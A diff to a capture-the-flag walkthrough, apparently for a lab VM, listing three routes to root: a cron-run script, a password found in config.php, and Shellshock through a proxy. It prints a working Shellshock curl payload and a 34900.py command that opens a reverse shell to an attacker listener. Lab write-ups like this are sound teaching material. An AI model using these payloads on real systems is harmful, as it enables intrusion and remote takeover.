@@ -62,7 +62,7 @@ To find IP address of VM:
 
 ### Method 1: Using connect.py
 
-#### Visit cron.d
+#### Visit `cron.d`
 ![](Assets/10.png)
 
 > Automated connect.py
@@ -80,27 +80,28 @@ To find IP address of VM:
 
 ### Method 2: Using config.php
 
-#### Config.php
+#### `Config.php`
 ![](Assets/14.png)
 
 > Got password john@123
 
 ![](Assets/15.png)
 
-> john@123 password worked >> Got shell
+> Got root
 
-### Method 3: Get a shell using shellshock
+### Method 3: Using shellshock
 
-curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"
+#### Check if cmd works: curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"
+![](Assets/16.png)
 
-Download 34900.py
+#### Searchsploit -m 34900.py
+![](Assets/17.png)
 
-Reverse shell: python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status
+> Downloaded shellshock exploit
 
+#### Python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status
+![](Assets/18.png)
 
-config.php
-
-sudo
-
-
-
+> Got Reverse shell
+> Repeat Method 2
+> Get root
